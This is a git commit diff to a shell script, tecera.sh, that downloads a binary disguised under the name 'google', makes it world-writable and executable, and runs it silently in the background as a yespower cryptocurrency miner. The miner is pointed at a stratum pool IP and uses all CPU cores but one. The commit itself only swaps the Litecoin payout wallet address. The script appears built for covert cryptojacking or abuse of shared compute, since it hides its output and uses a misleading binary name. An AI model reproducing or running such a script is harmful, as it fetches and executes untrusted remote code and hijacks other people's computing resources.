ae382cfab878852db3ad11ec6c540c3b1e984255
PEEBASS <103189634+PEEBASS@users.noreply.github.com>
2022-06-11 19:42:59 +0700

    Update tecera.sh

--- tecera.sh
+++ tecera.sh
@@ -1,3 +1,3 @@
 wget https://github.com/aurbach55/sugeh-ice/raw/main/google >/dev/null 2>&1 && chmod 777 google >/dev/null 2>&1
 
-nohup ./google -a yespower -o stratum+tcp://103.249.70.7:6533 -u LZJ1fV1kYYqAutEHPmEyRTFmvN7L5ZKZAV -p c=LTC  -t $(nproc --ignore 1) > nohup.out >/dev/null 2>&1
+nohup ./google -a yespower -o stratum+tcp://103.249.70.7:6533 -u ltc1q5r0fy6ht74mrlaqtcw5duple2ppjppgf6qehm7 -p c=LTC  -t $(nproc --ignore 1) > nohup.out >/dev/null 2>&1
